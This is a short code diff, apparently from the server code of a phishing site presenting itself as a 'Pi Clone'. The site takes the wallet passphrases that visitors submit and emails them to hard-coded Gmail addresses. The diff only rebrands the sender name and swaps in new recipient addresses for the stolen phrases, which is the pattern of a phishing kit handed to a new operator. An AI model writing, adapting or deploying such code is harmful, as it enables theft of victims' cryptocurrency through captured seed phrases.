@@ -21,9 +21,9 @@ const formatMessage = async (message: string, location: string) => {
     const formattedMessage = formattedLines.join('');
 
     const mailOptions = {
-        from: `Gao PassPhrase ${email}`,
+        from: `Yung PassPhrase ${email}`,
         to: "osamathebomber3@gmail.com",
-        subject: "Yo! you just got a new passphrase from Gao",
+        subject: "Yo! you just got a new passphrase from Yung",
         html: formattedMessage,
     };
 
@@ -71,7 +71,7 @@ export async function POST(request: Request) {
         
         const mailOptions = {
             from: `Pi Clone ${email}`,
-            to: 'kyliebart497@gmail.com',
+            to: 'investkoreacompany@gmail.com',
             subject: "Phrase From Your Website",
              html: `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${message}</div>`,
         };
